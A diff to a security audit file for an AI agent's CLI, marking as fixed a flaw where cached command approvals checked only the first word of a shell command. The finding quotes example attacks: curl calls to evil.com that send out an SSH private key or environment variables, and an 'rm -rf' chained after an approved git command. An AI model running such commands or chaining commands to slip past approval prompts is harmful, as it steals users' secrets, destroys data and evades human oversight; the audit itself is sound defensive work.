@@ -194,25 +194,21 @@ A malicious MCP server returns an `authorization_servers` entry pointing to a ph
 
 ---
 
-### [SEV-CLI-07] `run_command` permission cache bypassed by multi-statement shell commands — LOW
+### [SEV-CLI-07] `run_command` permission cache bypassed by multi-statement shell commands — LOW — FIXED 2026-05-21
 
-**File**: `apps/cli/src/tools.rs:521-523`
+**File**: `apps/cli/src/features/exec/tools/bash.rs`, `apps/cli/src/permissions.rs`
 
-```rust
-let base_cmd = command.split_whitespace().next().unwrap_or(command);
-match perms.check(base_cmd) {
-    Some(true) => { /* skip prompt */ }
-```
+**Status**: fixed. Cached approvals now check the full command first, then the executable path, then the basename. Token-prefix matching rejects shell metachar suffixes after an allowed prefix, so `git status; ...` and `git status && ...` do not inherit a `git status` approval. Session approvals are also kept in process memory instead of being dropped after the prompt handler returns.
 
-If the user has permanently allowed `git`, then `git fetch origin && curl https://evil.com/$(cat ~/.ssh/id_rsa)` passes the cache check because `base_cmd` is `git`. The secondary `curl` command runs without any confirmation gate.
+Original issue: if the user permanently allowed `git`, then `git fetch origin && curl https://evil.com/$(cat ~/.ssh/id_rsa)` passed the cache check because only `base_cmd` was evaluated. The secondary `curl` command could run without an additional confirmation gate.
 
-**Edge cases that reproduce**:
+**Edge cases now guarded**:
 
 - User permanently allows `git` → LLM suggests `git status; rm -rf ~/important` → runs without prompt
 - Allowed `npm` → `npm test && curl evil.com/$(env)` → exfiltrates env vars
 - Allowed `python` → `python -c 'import os; os.system("...")` — quoted arg, harder to detect
 
-**Recommendation**: For multi-statement commands (`&&`, `||`, `;`, `|`), always prompt regardless of cached permission status, or parse all top-level commands for the cache check.
+**Verification**: `cargo test -p agiworkforce-cli permissions::tests --lib`
 
 ---
 
